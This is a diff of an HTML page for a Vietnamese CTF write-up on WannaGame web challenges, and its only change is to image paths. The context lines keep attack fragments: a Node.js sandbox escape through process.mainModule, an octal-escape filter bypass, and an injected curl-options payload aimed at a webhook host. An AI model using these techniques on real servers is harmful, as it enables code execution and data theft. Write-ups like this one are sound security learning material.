@@ -1396,7 +1396,7 @@
   <div class="content">
     <p>WannaGame vừa mới kết thúc, mình xin viết lại một số bài mà mình làm được, giải này mình khá may mắn khi giải được 2 bài và mình cũng học được rất nhiều thứ từ giải này.</p>
 
-<p><a href="/wannagame/1.png" class="popup img-link  shimmer"><img src="/wannagame/1.png" alt="alt text" loading="lazy"></a></p>
+<p><a href="/assets/wannagame/1.png" class="popup img-link  shimmer"><img src="/assets/wannagame/1.png" alt="alt text" loading="lazy"></a></p>
 
 <h2 id="newchall"><span class="me-2">newchall</span><a href="#newchall" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>
 <div class="language-plaintext highlighter-rouge"><div class="code-header">
@@ -1438,7 +1438,7 @@ http://45.122.249.68:20011
       <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
 </pre></td><td class="rouge-code"><pre><span class="nb">global</span><span class="p">.</span><span class="nx">process</span><span class="p">.</span><span class="nx">mainModule</span><span class="p">[</span><span class="dl">"</span><span class="s2">require</span><span class="dl">"</span><span class="p">]</span>
 </pre></td></tr></tbody></table></code></div></div>
-<p><a href="/wannagame/2.png" class="popup img-link  shimmer"><img src="/wannagame/2.png" alt="alt text" loading="lazy"></a></p>
+<p><a href="/assets/wannagame/2.png" class="popup img-link  shimmer"><img src="/assets/wannagame/2.png" alt="alt text" loading="lazy"></a></p>
 
 <p>Ta có thể đổi <code class="language-plaintext highlighter-rouge">require</code> thành <code class="language-plaintext highlighter-rouge">requir\145</code> (\145 là mã octal của e) vì trong quá trình thực thi <code class="language-plaintext highlighter-rouge">requir\145</code> sẽ được chuyển thành <code class="language-plaintext highlighter-rouge">require</code> và chúng ta có thể lợi dụng cái này để bypass filters</p>
 
@@ -1451,7 +1451,7 @@ http://45.122.249.68:20011
 
 <p>Và mình có được flag</p>
 
-<p><a href="/wannagame/3.png" class="popup img-link  shimmer"><img src="/wannagame/3.png" alt="alt text" loading="lazy"></a></p>
+<p><a href="/assets/wannagame/3.png" class="popup img-link  shimmer"><img src="/assets/wannagame/3.png" alt="alt text" loading="lazy"></a></p>
 
 <p>Sau khi dump ra được source thì đây là các chuỗi bị chặn</p>
 
@@ -1711,8 +1711,8 @@ http://45.122.249.68:20014
 
 <p>Và đúng là thế, nó sẽ chạy phần code phía sau nhưng mà chúng ta không thể thấy phần output thôi</p>
 
-<p><a href="/wannagame/4.png" class="popup img-link  shimmer"><img src="/wannagame/4.png" alt="alt text" loading="lazy"></a>
-<a href="/wannagame/5.png" class="popup img-link  shimmer"><img src="/wannagame/5.png" alt="alt text" loading="lazy"></a></p>
+<p><a href="/assets/wannagame/4.png" class="popup img-link  shimmer"><img src="/assets/wannagame/4.png" alt="alt text" loading="lazy"></a>
+<a href="/assets/wannagame/5.png" class="popup img-link  shimmer"><img src="/assets/wannagame/5.png" alt="alt text" loading="lazy"></a></p>
 
 <p>Đến phần <code class="language-plaintext highlighter-rouge">/api/curr</code></p>
 
@@ -1816,13 +1816,13 @@ user-agent = "yuu"
 </pre></td><td class="rouge-code"><pre>url =xxxxxx.webhook.com&amp;opt=-K&amp;data=GET
 </pre></td></tr></tbody></table></code></div></div>
 
-<p><a href="/wannagame/7.png" class="popup img-link  shimmer"><img src="/wannagame/7.png" alt="alt text" loading="lazy"></a></p>
+<p><a href="/assets/wannagame/7.png" class="popup img-link  shimmer"><img src="/assets/wannagame/7.png" alt="alt text" loading="lazy"></a></p>
 
 <p>Vậy là có thể gửi tới bất kỳ url nào với bất kỳ options nào mà ta muốn</p>
 
 <p>Vậy với những thứ này thì làm sao lấy flag từ mongoDB đây? MongoDB giao tiếp thông qua MongoDB Wire Protocol. Người dùng có thể giao tiếp với database server thông qua TCP/IP. Vậy chúng ta có thể dùng gopher để và dùng curl để connect tới database server và lấy flag, nhưng tiếc là chúng ta không thể dùng gopher vì author đã set up như bên dưới</p>
 
-<p><a href="/wannagame/6.png" class="popup img-link  shimmer"><img src="/wannagame/6.png" alt="alt text" loading="lazy"></a></p>
+<p><a href="/assets/wannagame/6.png" class="popup img-link  shimmer"><img src="/assets/wannagame/6.png" alt="alt text" loading="lazy"></a></p>
 
 <p>Nhưng mà vẫn có một số protocol khác như telnet khi mà chúng cũng giao tiếp bằng TCP</p>
 
@@ -1830,7 +1830,7 @@ user-agent = "yuu"
 
 <p>Ta có thể bắt file này bằng cách tạo một file để giả lập việc lấy flag và sử dụng tcpdump để bắt gói tin đó</p>
 
-<p><a href="/wannagame/8.png" class="popup img-link  shimmer"><img src="/wannagame/8.png" alt="alt text" loading="lazy"></a></p>
+<p><a href="/assets/wannagame/8.png" class="popup img-link  shimmer"><img src="/assets/wannagame/8.png" alt="alt text" loading="lazy"></a></p>
 
 <p>File js dùng để lấy flag</p>
 
@@ -1856,13 +1856,13 @@ user-agent = "yuu"
 
 <p>Đây là nội dung lúc giao tiếp với server</p>
 
-<p><a href="/wannagame/9.png" class="popup img-link  shimmer"><img src="/wannagame/9.png" alt="alt text" loading="lazy"></a></p>
+<p><a href="/assets/wannagame/9.png" class="popup img-link  shimmer"><img src="/assets/wannagame/9.png" alt="alt text" loading="lazy"></a></p>
 
 <p>Ta có thể tải nội dung TCP payload về, đây chính là quá trình mà server giao tiếp với database</p>
 
 <p>Thử dùng file này để giao tiếp xem có được không</p>
 
-<p><a href="/wannagame/10.png" class="popup img-link  shimmer"><img src="/wannagame/10.png" alt="alt text" loading="lazy"></a></p>
+<p><a href="/assets/wannagame/10.png" class="popup img-link  shimmer"><img src="/assets/wannagame/10.png" alt="alt text" loading="lazy"></a></p>
 
 <p>Nó có trả về flag vậy có nghĩa là chúng ta có thể dùng cách này</p>
 
@@ -1986,7 +1986,7 @@ user-agent = "yuu"
 
 </pre></td></tr></tbody></table></code></div></div>
 
-<p><a href="/wannagame/11.png" class="popup img-link  shimmer"><img src="/wannagame/11.png" alt="alt text" loading="lazy"></a></p>
+<p><a href="/assets/wannagame/11.png" class="popup img-link  shimmer"><img src="/assets/wannagame/11.png" alt="alt text" loading="lazy"></a></p>
 
 <p><strong><code class="language-plaintext highlighter-rouge">Flag: W1{nice_try_without_gopher}</code></strong></p>
 
